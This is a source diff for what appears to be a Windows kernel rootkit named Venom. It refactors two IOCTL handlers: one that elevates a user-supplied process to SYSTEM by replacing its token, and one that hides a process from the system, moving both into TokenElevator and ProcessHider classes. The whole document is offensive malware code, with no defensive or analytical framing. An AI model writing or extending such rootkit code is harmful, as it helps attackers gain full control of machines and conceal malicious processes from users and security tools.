@@ -1,18 +1,19 @@
 #include "IoctlHandlers.h"
-#include "ProcHandler.h"
 #include "Process.h"
+#include "Token.h"
 #include "Capabilities/ProcessCapabilities/ProcessHider.h"
+#include "Capabilities/TokenCapabilities/TokenElevator.h"
 #include "TokenHandler.h"
 #include "NetworkHandler.h"
 #include "Venom.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
-	PEPROCESS Process;
-	PACCESS_TOKEN Token;
+	//PEPROCESS Process;
+	//PACCESS_TOKEN Token;
 	auto status = STATUS_SUCCESS;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
 
 	DbgPrint("Token Elevator: Received pid %lu", *pid);
 
@@ -21,17 +22,19 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 		return STATUS_INVALID_PARAMETER;
 	}
 
-	status = PsLookupProcessByProcessId(UlongToHandle(*pid), &Process);
+	auto process = Process(*pid);
+	auto token = Token(process);
 
-	if (!NT_SUCCESS(status)) {
-		Irp->IoStatus.Information = 0;
-		return status;
-	}
-	Token = PsReferencePrimaryToken(Process); // Get the process primary token.
-	TokenHandler::ReplaceToken(Process, Token); // Replace the process token with system token.
+	//status = PsLookupProcessByProcessId(UlongToHandle(*pid), &Process);
 
-	ObDereferenceObject(Token);
-	ObDereferenceObject(Process);
+	//if (!NT_SUCCESS(status)) {
+	//	Irp->IoStatus.Information = 0;
+	//	return status;
+	//}
+	//Token = PsReferencePrimaryToken(Process); // Get the process primary token.
+	//TokenHandler::ReplaceToken(Process, Token); // Replace the process token with system token.
+	auto tokenElevator = TokenElevator(token);
+	status = tokenElevator.elevate();
 
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
@@ -40,15 +43,14 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 
 NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	const auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	const auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
 	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
 	auto process = Process(*pid);
-	//status = ProcHandler::UnlinkActiveProcessLinks(*pid);
 	auto processHider = ProcessHider(process);
 	status = processHider.hide();
 	Irp->IoStatus.Information = 0;
